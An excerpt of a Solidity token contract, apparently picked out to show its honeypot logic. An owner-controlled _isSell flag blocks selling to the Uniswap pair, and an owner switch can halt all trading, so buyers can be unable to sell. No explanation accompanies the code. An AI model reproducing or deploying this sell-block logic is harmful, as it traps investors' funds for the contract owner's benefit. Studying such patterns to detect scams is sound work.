...
contract TestToken is Context, IERC20, Ownable {
    ...
    address payable public marketingAddress = payable(0xf454EC431613a052a5574Db4a2Bdb05Ddbb5ED37); // Marketing Address
    ...
    function _transfer(
        ...
        require(tradingEnable != false, "Desabled Buy and Sell");
        ...
        if (to == uniswapV2Pair && balanceOf(uniswapV2Pair) > 0) {
            require(_isSell[from] != false, "You can't sell the token");
    ...
    function enableSell(address account) public onlyOwner {
        _isSell[account] = true;
    }

    function disableSell(address account) public onlyOwner {
        _isSell[account] = false;
    }
    ...
    function SetEnableTrading(bool status) external onlyOwner {
        tradingEnable = status;
    }

    function isEnabledTrading() public view returns(bool) {
    ...
    function isEnabledSell(address account) external view returns(bool) {
        return _isSell[account];
    }
